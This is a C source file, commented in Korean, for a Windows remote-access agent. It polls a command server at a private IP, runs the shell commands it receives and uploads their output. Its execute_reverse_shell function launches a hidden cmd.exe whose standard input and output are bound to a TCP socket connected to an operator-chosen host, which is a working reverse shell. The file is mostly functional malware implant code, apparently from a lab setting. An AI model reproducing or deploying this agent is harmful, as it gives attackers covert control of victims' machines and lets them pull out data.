#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
// 
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>

#include "cJSON.h"

// --- 상수 및 설정 ---
#define CHUNK_SIZE 4096 			// 수신 버퍼 크기
#define REQUEST_BUFFER_SIZE 8192	// HTTP 요청 생성 버퍼 크기
#define MAX_OUTPUT_SIZE 4096 * 4	// 명령 결과 출력 최대 크기
#define SERVER_IP "192.168.30.129"
#define SERVER_PORT 8000
#define POLL_INTERVAL_SEC 10

// 🟢 클라이언트의 고유 식별자
#define CLIENT_ID "WORKER-C-001"	

#pragma comment(lib, "ws2_32.lib")

// --- 함수 선언 ---
// [HTTP/Network]
char* http_request(const char* method, const char* path, const char* payload, int payload_len);
char* parse_http_response(const char* full_response, char** json_body);
void report_file_to_server(int task_id, const char* status, const char* filename, const char* file_content, int exit_code);

// [Execution & Utility]
void parse_command_json(const char* json_string);
char* execute_and_capture(const char* command, int* exit_code);
char* convert_to_utf8(const char* ansi_string);
char* save_output_to_file(const char* output, int task_id, char* filename_buffer, size_t buffer_size);
char* read_file_to_string(const char* filepath);
void execute_reverse_shell(int task_id, cJSON* payload);

// [Command Modules] - 🚩 새롭게 정의된 명령 실행 함수들
void execute_shell_command(int task_id, cJSON* payload);
void execute_file_download(int task_id, cJSON* payload);
void execute_get_sysinfo(int task_id, cJSON* payload);


// ----------------------------------------------------------------------
// 0. 인코딩 및 파일 유틸리티 함수 (기존 코드 유지)
// ----------------------------------------------------------------------

char* convert_to_utf8(const char* ansi_string) {
    if (!ansi_string || *ansi_string == '\0') {
        return strdup("");
    }

    int wlen = MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, NULL, 0);
    if (wlen == 0) return strdup("");

    wchar_t* wbuffer = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (!wbuffer) return strdup("");
    MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, wbuffer, wlen);

    int utf8len = WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, NULL, 0, NULL, NULL);
    if (utf8len == 0) { free(wbuffer); return strdup(""); }

    char* utf8_buffer = (char*)malloc(utf8len);
    if (!utf8_buffer) { free(wbuffer); return strdup(""); }
    WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, utf8_buffer, utf8len, NULL, NULL);

    free(wbuffer);
    return utf8_buffer;
}

// 명령 결과를 파일로 저장하고 파일명을 반환합니다.
char* save_output_to_file(const char* output, int task_id, char* filename_buffer, size_t buffer_size) {
    // 파일명 형식: <task_id>_output_<timestamp>.txt
    snprintf(filename_buffer, buffer_size, "%d_output_%ld.txt", task_id, (long)time(NULL));

    FILE* fp = fopen(filename_buffer, "wb");
    if (fp == NULL) {
        fprintf(stderr, "[ERROR] 파일 쓰기 실패: %s\n", filename_buffer);
        return NULL;
    }

    // 결과(UTF-8)를 파일에 기록
    fwrite(output, 1, strlen(output), fp);
    fclose(fp);

    printf("[INFO] 결과 파일 생성 완료: %s\n", filename_buffer);
    return filename_buffer;
}

// 파일 내용을 모두 읽어 문자열로 반환합니다.
char* read_file_to_string(const char* filepath) {
    FILE* fp = fopen(filepath, "rb");
    if (fp == NULL) {
        fprintf(stderr, "[ERROR] 파일 읽기 실패: %s\n", filepath);
        return NULL;
    }

    // 파일 크기 확인
    struct stat st;
    if (stat(filepath, &st) != 0) {
        fclose(fp);
        return NULL;
    }
    long file_size = st.st_size;

    // 문자열 버퍼 할당
    char* content = (char*)malloc(file_size + 1);
    if (content == NULL) {
        fclose(fp);
        return NULL;
    }

    // 파일 내용 읽기
    size_t bytes_read = fread(content, 1, file_size, fp);
    content[bytes_read] = '\0';

    fclose(fp);
    return content; // 호출자가 free 해야 함
}

// ----------------------------------------------------------------------
// 1. 명령 모듈 정의 (Command Modules)
// ----------------------------------------------------------------------

/**
 * @brief REVERSE_SHELL_CONNECT 모듈: 서버로 TCP 연결을 시도하여 셸을 전달합니다.
 */
void execute_reverse_shell(int task_id, cJSON* payload) {
    cJSON* ip_item = cJSON_GetObjectItemCaseSensitive(payload, "ip");
    cJSON* port_item = cJSON_GetObjectItemCaseSensitive(payload, "port");

    if (!cJSON_IsString(ip_item) || !cJSON_IsNumber(port_item)) {
        fprintf(stderr, "[ERROR] REVERSE_SHELL_CONNECT: IP 또는 Port가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "IP 또는 Port 매개변수가 누락되었습니다.", 1);
        return;
    }

    const char* server_ip = ip_item->valuestring;
    int server_port = port_item->valueint;

    printf("\n[MODULE] REVERSE_SHELL_CONNECT: %s:%d 로 리버스 셸 연결 시도.\n", server_ip, server_port);

    SOCKET shell_socket;
    struct sockaddr_in server_addr;

    // 1. 소켓 생성
    // WSASocket을 사용하여 소켓 핸들을 얻습니다.
    if ((shell_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] 소켓 생성 실패. Code: %d\n", WSAGetLastError());
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "Failed to create socket.", 1);
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    // 2. 서버 연결
    if (connect(shell_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        fprintf(stderr, "[ERROR] 서버 연결 실패 (%s:%d). Code: %d\n", server_ip, server_port, WSAGetLastError());
        closesocket(shell_socket);
        report_file_to_server(task_id, "FAILED", "rs_connection_fail.txt", "Failed to connect to the shell listener.", 1);
        return;
    }

    printf("[INFO] 서버 연결 성공. WinAPI를 통해 셸 I/O 연결 시작.\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    // 3. 🚩 핵심: 소켓 핸들을 표준 I/O로 사용하도록 플래그 설정
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

    // 4. 🚩 핵심: 소켓 핸들을 I/O 핸들로 할당
    // SOCKET 타입은 HANDLE 타입과 동일하게 처리될 수 있습니다. (Windows OS 내부 메커니즘)
    si.hStdInput = (HANDLE)shell_socket;
    si.hStdOutput = (HANDLE)shell_socket;
    si.hStdError = (HANDLE)shell_socket;

    // 셸 창을 숨깁니다.
    si.wShowWindow = SW_HIDE;

    // cmd.exe 대신 powershell.exe를 사용할 수 있지만, cmd.exe가 더 보편적입니다.
    // /K 플래그는 셸이 종료되지 않고 대기하도록 합니다.
    char cmdLine[] = "cmd.exe /K";

    // 5. 셸 프로세스 생성
    // bInheritHandles = TRUE로 설정하여 소켓 핸들이 자식 프로세스(cmd.exe)에 상속되도록 합니다.
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[ERROR] 셸 프로세스 생성 실패. Code: %d\n", GetLastError());
        closesocket(shell_socket);
        report_file_to_server(task_id, "FAILED", "rs_process_fail.txt", "Failed to launch shell process.", 1);
        return;
    }

    printf("[INFO] 셸 프로세스 (cmd.exe)가 소켓 핸들을 상속받아 백그라운드에서 실행됩니다.\n");

    // 6. 생성된 프로세스 및 스레드 핸들 닫기 (메모리 누수 방지)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    // 소켓 핸들은 자식 프로세스가 사용 중이므로 닫지 않습니다.

    char report_content[256];
    snprintf(report_content, sizeof(report_content),
        "WinAPI Reverse shell session to %s:%d has been initiated.",
        server_ip, server_port);

    report_file_to_server(task_id, "COMPLETED", "rs_session_start_api.txt", report_content, 0);
}

/**
 * @brief EXECUTE_SHELL 모듈: 쉘 명령을 실행하고 결과를 서버에 보고합니다. (기존 로직 분리)
 */
void execute_shell_command(int task_id, cJSON* payload_item) {
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "command");
    cJSON* args_item = cJSON_GetObjectItemCaseSensitive(payload_item, "arguments");

    if (cJSON_IsString(cmd_item) && cJSON_IsArray(args_item)) {
        const char* base_command = cmd_item->valuestring;
        char full_command[1024];

        // --- 명령 구성 로직 ---
        memset(full_command, 0, sizeof(full_command));
        strncpy(full_command, base_command, sizeof(full_command) - 1);
        full_command[sizeof(full_command) - 1] = '\0';

        cJSON* arg = NULL;
        int remaining_space = sizeof(full_command) - strlen(full_command);

        cJSON_ArrayForEach(arg, args_item) {
            if (cJSON_IsString(arg) && remaining_space > 0) {
                if (remaining_space > 1) {
                    strcat(full_command, " ");
                    remaining_space--;
                }
                strncat(full_command, arg->valuestring, remaining_space);
                remaining_space = sizeof(full_command) - strlen(full_command);
            }
        }
        // --- 명령 구성 로직 끝 ---

        printf("\n[EXECUTE_SHELL] 명령 실행: %s\n", full_command);

        int exit_code = 0;
        char* output = execute_and_capture(full_command, &exit_code);
        char* utf8_output = convert_to_utf8(output);

        // --- 파일 저장 및 업로드 로직 ---
        char filename[256];
        char* filepath = save_output_to_file(utf8_output, task_id, filename, sizeof(filename));

        if (filepath != NULL) {
            char* file_content = read_file_to_string(filepath);
            const char* report_status = (exit_code == 0) ? "COMPLETED" : "FAILED";

            report_file_to_server(task_id, report_status, filename, file_content, exit_code);

            if (file_content) free(file_content);
        }
        // -----------------------------------

        if (utf8_output) free(utf8_output);
        if (output) free(output);
    }
    else {
        printf("[ERROR] EXECUTE_SHELL: 'command' 또는 'arguments'가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing command or arguments.", 1);
    }
}


/**
 * @brief FILE_DOWNLOAD 모듈: 파일 다운로드 모듈 (Placeholder)
 */
void execute_file_download(int task_id, cJSON* payload) {
    cJSON* url_item = cJSON_GetObjectItemCaseSensitive(payload, "url");
    cJSON* path_item = cJSON_GetObjectItemCaseSensitive(payload, "path");

    if (cJSON_IsString(url_item) && cJSON_IsString(path_item)) {
        printf("[MODULE] FILE_DOWNLOAD: 다운로드 요청 감지.\n");
        printf("[MODULE] URL: %s\n", url_item->valuestring);
        printf("[MODULE] PATH: %s\n", path_item->valuestring);

        // 🚩 실제 HTTP 다운로드 로직은 여기에 구현해야 합니다. 
        // 성공 시뮬레이션
        int exit_code = 0;
        char filename[] = "download_log.txt";
        char report_content[] = "File download simulation completed.";
        report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);

    }
    else {
        printf("[ERROR] FILE_DOWNLOAD: Missing URL or Path in payload.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing URL or Path parameters.", 1);
    }
}

/**
 * @brief GET_SYSINFO 모듈: 시스템 정보 수집 모듈 (Placeholder)
 */
void execute_get_sysinfo(int task_id, cJSON* payload) {
    printf("[MODULE] GET_SYSINFO: 시스템 정보 수집 요청 감지.\n");
    cJSON* mode_item = cJSON_GetObjectItemCaseSensitive(payload, "mode");
    printf("[INFO] Mode: %s\n", cJSON_IsString(mode_item) ? mode_item->valuestring : "default");

    // 🚩 실제 정보 수집 로직은 여기에 구현해야 합니다. (예: systeminfo 명령어 캡처)

    // 수집 시뮬레이션
    int exit_code = 0;
    char filename[] = "system_report.txt";
    char report_content[] = "System info gathered: OS=Windows, RAM=16GB (Simulated)";
    report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);
}


// ----------------------------------------------------------------------
// 2. cJSON 파싱 및 명령 디스패처 (Command Dispatcher)
// ----------------------------------------------------------------------

void parse_command_json(const char* json_string) {
    cJSON* root = cJSON_Parse(json_string);
    if (root == NULL) {
        fprintf(stderr, "[ERROR] cJSON 파싱 실패.\n");
        return;
    }

    cJSON* status_item = cJSON_GetObjectItemCaseSensitive(root, "status");

    // 🚩 command_assigned 상태일 때만 명령을 실행합니다.
    if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "command_assigned") == 0) {
        cJSON* id_item = cJSON_GetObjectItemCaseSensitive(root, "command_id");
        cJSON* name_item = cJSON_GetObjectItemCaseSensitive(root, "command_name");
        cJSON* payload_item = cJSON_GetObjectItemCaseSensitive(root, "payload");
        cJSON* client_id_item = cJSON_GetObjectItemCaseSensitive(root, "client_id");

        if (cJSON_IsString(name_item) && cJSON_IsObject(payload_item) && cJSON_IsNumber(id_item)) {
            const char* command_name = name_item->valuestring;
            int task_id = id_item->valueint;

            if (cJSON_IsString(client_id_item)) {
                printf("[EXEC] 작업 할당 완료. Task ID: %d, 명령: %s, 대상 클라이언트 ID: %s\n", task_id, command_name, client_id_item->valuestring);
            }

            // 🚩 명령 디스패처 (Command Dispatcher)
            if (strcmp(command_name, "EXECUTE_SHELL") == 0) {
                execute_shell_command(task_id, payload_item);
            }
            else if (strcmp(command_name, "SHELL_CONNECT") == 0) {
                execute_reverse_shell(task_id, payload_item);
            }
            
            else if (strcmp(command_name, "FILE_DOWNLOAD") == 0) {
                execute_file_download(task_id, payload_item);
            }
            else if (strcmp(command_name, "GET_SYSINFO") == 0) {
                execute_get_sysinfo(task_id, payload_item);
            }
            else {
                // 알 수 없는 명령 처리
                printf("[WARNING] 알 수 없는 명령 유형: %s\n", command_name);
                report_file_to_server(task_id, "FAILED", "error_log.txt", "Unknown command name received.", 1);
            }
        }
    }
    else if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "no_command") == 0) {
        // 🚩 평소에는 명령이 없다는 메시지만 출력합니다. (실행되는 모듈 없음)
        printf("[POLL] 대기 중인 명령 없음.\n");
    }
    else {
        // 기타 상태 처리 (예: 에러 메시지)
        printf("[POLL] 서버 응답: %s\n", cJSON_IsString(status_item) ? status_item->valuestring : "Unknown Status");
    }

    cJSON_Delete(root);
}

// ----------------------------------------------------------------------
// 3. HTTP 요청 및 응답 처리 함수 (기존 코드 유지)
// ----------------------------------------------------------------------

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[ERROR] WinSock 초기화 실패. 코드: %d\n", WSAGetLastError());
        return 1;
    }
    printf("[INFO] WinSock 초기화 성공. 클라이언트 실행됨. ID: %s\n", CLIENT_ID);

    while (1) {
        // 🚩 평소에는 정해진 시간 간격으로 폴링만 합니다.
        printf("\n--- %d초 폴링 대기 중 ---\n", POLL_INTERVAL_SEC);
        Sleep(POLL_INTERVAL_SEC * 1000);

        char poll_path[128];
        snprintf(poll_path, sizeof(poll_path), "/api/poll/?client_id=%s", CLIENT_ID);

        printf("[INFO] 서버에 명령 폴링 요청: %s\n", poll_path);

        char* full_response = http_request("GET", poll_path, NULL, 0);




        if (full_response != NULL) {
            char* json_body = NULL;
            parse_http_response(full_response, &json_body);

            if (json_body != NULL) {
                printf("[INFO] JSON 본문 수신: %s\n", json_body);
                // 🚩 수신된 JSON을 디스패처로 전달 (명령이 있을 때만 실행)
                parse_command_json(json_body);
                free(json_body);
            }
            else {
                fprintf(stderr, "[ERROR] HTTP 본문 추출 실패 또는 빈 응답.\n");
            }
            free(full_response);
        }
        else {
            fprintf(stderr, "[ERROR] HTTP 요청 실패. 다음 폴링 대기.\n");
        }
    }

    WSACleanup();
    return 0;
}

char* http_request(const char* method, const char* path, const char* payload, int payload_len) {
    SOCKET sock;
    struct sockaddr_in server;

    char request[REQUEST_BUFFER_SIZE];
    char recv_buffer[CHUNK_SIZE];

    char* full_response = NULL;
    int total_received = 0;
    int recv_size;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) return NULL;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        return NULL;
    }

    if (strcmp(method, "GET") == 0) {
        snprintf(request, REQUEST_BUFFER_SIZE,
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Connection: close\r\n\r\n",
            path, SERVER_IP, SERVER_PORT
        );
    }
    else if (strcmp(method, "POST") == 0) {
        snprintf(request, REQUEST_BUFFER_SIZE,
            "POST %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %d\r\n"
            "Connection: close\r\n\r\n"
            "%s",
            path, SERVER_IP, SERVER_PORT, payload_len, payload
        );
    }
    else {
        closesocket(sock);
        return NULL;
    }

    if (send(sock, request, strlen(request), 0) < 0) {
        closesocket(sock);
        return NULL;
    }

    while ((recv_size = recv(sock, recv_buffer, CHUNK_SIZE, 0)) > 0) {
        char* temp = (char*)realloc(full_response, total_received + recv_size + 1);
        if (temp == NULL) break;

        full_response = temp;
        memcpy(full_response + total_received, recv_buffer, recv_size);
        total_received += recv_size;
        full_response[total_received] = '\0';
    }

    closesocket(sock);
    return full_response;
}

char* parse_http_response(const char* full_response, char** json_body) {
    const char* body_start = strstr(full_response, "\r\n\r\n");

    if (body_start == NULL) return NULL;
    body_start += 4;

    size_t body_len = strlen(body_start);
    if (body_len == 0) return NULL;

    *json_body = (char*)malloc(body_len + 1);
    if (*json_body == NULL) return NULL;

    strcpy(*json_body, body_start);
    return (char*)body_start;
}

void report_file_to_server(int task_id, const char* status, const char* filename, const char* file_content, int exit_code) {
    cJSON* report_json = cJSON_CreateObject();

    cJSON_AddNumberToObject(report_json, "command_id", task_id);
    cJSON_AddStringToObject(report_json, "status", status);
    cJSON_AddStringToObject(report_json, "filename", filename);

    cJSON_AddStringToObject(report_json, "file_content", file_content ? file_content : "No content captured.");
    cJSON_AddNumberToObject(report_json, "exit_code", exit_code);

    char* json_payload = cJSON_PrintUnformatted(report_json);

    if (json_payload) {
        printf("\n[REPORT] 서버에 파일 내용 JSON 보고: /api/upload/receive/\n");

        char* response = http_request("POST", "/api/upload/receive/", json_payload, strlen(json_payload));

        if (response != NULL) {
            printf("[INFO] 보고 응답 수신.\n");
            free(response);
        }
        else {
            fprintf(stderr, "[ERROR] 보고서 전송 실패.\n");
        }

        free(json_payload);
    }
    else {
        fprintf(stderr, "[ERROR] 보고 JSON 생성 실패.\n");
    }

    cJSON_Delete(report_json);
}

// ----------------------------------------------------------------------
// 4. 명령 실행 및 결과 캡처 함수 (_popen 사용) (기존 코드 유지)
// ----------------------------------------------------------------------

char* execute_and_capture(const char* command, int* exit_code) {
    FILE* fp;
    char buffer[256];
    char* result_output = (char*)malloc(MAX_OUTPUT_SIZE);

    if (result_output == NULL) {
        *exit_code = -1;
        return strdup("[ERROR] Memory allocation failed for command output.");
    }
    result_output[0] = '\0';

    fp = _popen(command, "r");
    if (fp == NULL) {
        *exit_code = -1;
        sprintf(result_output, "[ERROR] Failed to execute command via _popen: %s", command);
        return result_output;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strlen(result_output) + strlen(buffer) < MAX_OUTPUT_SIZE) {
            strcat(result_output, buffer);
        }
        else {
            strcat(result_output, "\n[TRUNCATED OUTPUT]");
            break;
        }
    }

    *exit_code = _pclose(fp);

    if (*exit_code != 0) {
        *exit_code = 1;
    }

    return result_output;
}